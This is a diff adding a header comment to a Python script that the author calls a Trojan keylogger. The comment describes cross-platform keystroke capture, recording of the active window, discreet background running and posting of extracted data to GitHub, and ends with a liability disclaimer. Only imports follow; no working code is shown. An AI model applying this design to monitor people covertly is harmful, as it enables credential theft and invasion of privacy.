@@ -1,4 +1,29 @@
 #! /usr/bin/python
+#################################################################################################
+# Author: Nicholas Fisher
+# Date: March 5th 2024
+# Important Note:
+#  I, Nicholas Fisher, the creator of this Trojan malware, am not responsible for the misuse of 
+# these scripts. They are malicious and should only be used in professionally approved White Hat 
+# scenarios. You are responsible for any consequences resulting from the misuse of this malware,
+# including all fines, fees, and repercussions. Please read this statement carefully: by downloading 
+# any of the scripts in this repository, you, as the user, take full responsibility for storing, using,
+# and testing these malicious scripts and guidelines. You also take full responsibility for any misuse 
+# of this malware. Please note that any data the Trojan extracts will be posted to a GitHub repository, 
+# and if that repository is public, all the extracted data will be available for the whole world to see.
+# Description of Script
+# This script implements a cross-platform keylogger capable of logging keyboard inputs on both Windows
+# and Linux operating systems. It utilizes different libraries and modules depending on the platform, 
+# using pyHook for Windows and pynput for Linux. The script continuously monitors keyboard events, 
+# logging all key inputs, including printable characters and special keys, while also identifying 
+# the active window or process where the input is directed. To use the script, simply run it on the 
+# target system, and it will start logging keystrokes in the background. An example usage scenario 
+# would involve running the script discreetly on a system to monitor user activity for security or 
+# administrative purposes. The script output includes the logged keys along with details such as 
+$# the process ID, executable name, and window title where the input occurred. For instance, 
+# the output might display characters typed in a text editor along with information about 
+# the editor's process and window title, providing context for the logged keystrokes.
+#################################################################################################
 import platform
 import os
 import time
